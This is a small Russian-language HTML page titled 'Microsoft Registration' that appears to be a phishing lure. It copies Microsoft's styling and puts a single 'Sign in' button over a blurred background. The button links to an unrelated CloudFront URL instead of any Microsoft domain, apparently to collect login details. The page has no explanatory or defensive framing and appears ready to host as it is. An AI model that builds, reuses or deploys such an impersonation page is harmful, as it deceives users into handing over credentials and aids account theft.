<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Регистрация Microsoft</title>
    <style>
        /* Фоновое изображение на весь экран с размытием */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        .background {
            position: fixed;
            top: 0; left: 0;
            width: 100%;
            height: 100%;
            background: url('img/orig.webp') no-repeat center center;
            background-size: cover;
            filter: blur(8px);
            z-index: -1;
        }
        /* Центрированное белое окно */
        .content {
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            padding: 40px 60px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 320px;
            width: 90%;
        }
        .content h1 {
            margin-bottom: 30px;
            font-weight: 700;
            color: #222;
            font-size: 1.8rem;
        }
        .btn {
            display: inline-block;
            background-color: #0078d4;
            color: white;
            text-decoration: none;
            font-weight: 600;
            padding: 14px 42px;
            border-radius: 6px;
            font-size: 1.1rem;
            transition: background-color 0.3s ease;
            user-select: none;
        }
        .btn:hover,
        .btn:focus {
            background-color: #005a9e;
            outline: none;
        }
    </style>
</head>
<body>
    <div class="background"></div>
    <div class="content">
        <h1>Регистрация Microsoft</h1>
        <a href="https://d3644a89nx8m0t.cloudfront.net/index.html" class="btn" target="_blank" rel="noopener noreferrer">Войти</a>
    </div>
</body>
</html>
